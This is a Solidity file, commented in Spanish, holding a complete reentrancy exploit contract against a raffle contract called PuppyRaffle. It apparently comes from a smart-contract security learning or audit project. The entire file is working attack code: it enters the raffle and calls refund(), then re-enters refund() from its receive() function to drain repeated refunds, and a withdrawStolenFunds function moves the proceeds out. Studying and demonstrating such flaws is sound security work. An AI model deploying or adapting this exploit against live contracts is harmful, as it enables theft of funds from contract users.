// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

import {PuppyRaffle} from "../src/PuppyRaffle.sol";

/**
 * @title ReentrancyAttacker
 * @dev Contrato malicioso para demostrar la vulnerabilidad de reentrancy en PuppyRaffle
 * 
 * CÓMO FUNCIONA EL ATAQUE:
 * 1. El atacante entra a la rifa con 1 ETH
 * 2. Llama a refund() para obtener su reembolso
 * 3. Cuando recibe el ETH, se ejecuta la función receive()
 * 4. En receive(), llama a refund() de nuevo ANTES de que se actualice el estado
 * 5. Como el estado aún no se ha actualizado, puede obtener múltiples reembolsos
 * 6. Esto se repite hasta alcanzar maxAttacks
 * 
 * VULNERABILIDAD EXPLOTADA:
 * - El contrato PuppyRaffle hace el external call ANTES de actualizar el estado
 * - Esto viola el patrón checks-effects-interactions
 * - Permite múltiples llamadas a refund() antes de que se marque como reembolsado
 */
contract ReentrancyAttacker {
    PuppyRaffle public puppyRaffle;
    uint256 public playerIndex;
    uint256 public attackCount;
    uint256 public maxAttacks = 3; // Número de veces que queremos atacar
    
    // Eventos para debugging
    event AttackStarted(uint256 playerIndex);
    event ReentrancyExecuted(uint256 attackCount, uint256 balance);
    event AttackCompleted(uint256 totalStolen);

    constructor(address _puppyRaffle) {
        puppyRaffle = PuppyRaffle(_puppyRaffle);
    }

    /**
     * @dev Entra a la rifa para poder atacar
     * @notice Debe enviar exactamente entranceFee ETH
     */
    function enterRaffle() external payable {
        require(msg.value == 1e18, "Debe enviar exactamente 1 ETH");
        
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: msg.value}(players);
        
        // Obtener nuestro indice en el array
        playerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        
        emit AttackStarted(playerIndex);
    }

    /**
     * @dev Inicia el ataque de reentrancy
     * @notice Solo puede ser llamado una vez
     */
    function attack() external {
        require(attackCount == 0, "Ataque ya iniciado");
        require(puppyRaffle.players(playerIndex) == address(this), "Debe entrar a la rifa primero");
        
        // Iniciar el ataque llamando a refund()
        puppyRaffle.refund(playerIndex);
    }

    /**
     * @dev Función receive() que se ejecuta cuando recibimos ETH
     * @notice AQUÍ ES DONDE OCURRE EL REENTRANCY
     * @notice Se ejecuta ANTES de que se actualice el estado en PuppyRaffle
     */
    receive() external payable {
        if (attackCount < maxAttacks) {
            attackCount++;
            
            emit ReentrancyExecuted(attackCount, address(this).balance);
            
            // Llamar refund() de nuevo ANTES de que se actualice el estado
            // Como el estado aún no se ha actualizado (players[playerIndex] != address(0)),
            // podemos obtener múltiples reembolsos
            puppyRaffle.refund(playerIndex);
        }
        
        if (attackCount >= maxAttacks) {
            emit AttackCompleted(address(this).balance);
        }
    }

    /**
     * @dev Retira los fondos robados
     * @param recipient Dirección que recibirá los fondos
     */
    function withdrawStolenFunds(address payable recipient) external {
        require(recipient != address(0), "Destinatario no puede ser address(0)");
        uint256 balance = address(this).balance;
        recipient.transfer(balance);
    }

    /**
     * @dev Obtiene información del ataque
     */
    function getAttackInfo() external view returns (
        uint256 _playerIndex,
        uint256 _attackCount,
        uint256 _maxAttacks,
        uint256 _balance
    ) {
        return (playerIndex, attackCount, maxAttacks, address(this).balance);
    }

    /**
     * @dev Cambia el número máximo de ataques
     * @param _maxAttacks Nuevo número máximo de ataques
     */
    function setMaxAttacks(uint256 _maxAttacks) external {
        maxAttacks = _maxAttacks;
    }
} 